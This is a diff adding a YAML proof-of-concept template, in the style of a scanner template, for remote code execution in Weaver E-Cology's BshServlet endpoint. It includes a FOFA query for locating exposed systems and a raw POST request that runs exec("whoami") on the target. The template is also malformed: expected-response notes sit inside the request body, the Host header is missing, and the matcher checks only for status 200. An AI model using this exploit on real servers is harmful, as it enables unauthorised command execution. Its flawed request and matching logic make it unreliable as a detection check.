@@ -1,0 +1,42 @@
+id: poc-getyhxs20glwtagn
+info:
+  name: 泛微E-Cology bsh.servlet.BshServlet RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/getyhxs20glwtagn'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: getyhxs20glwtagn
+    fofa: app="泛微-EOffice"||app="泛微-OA（e-cology）"
+http:
+- raw:
+  - 'POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    bsh.script=exec("whoami");&bsh.servlet.output=raw
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    system
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
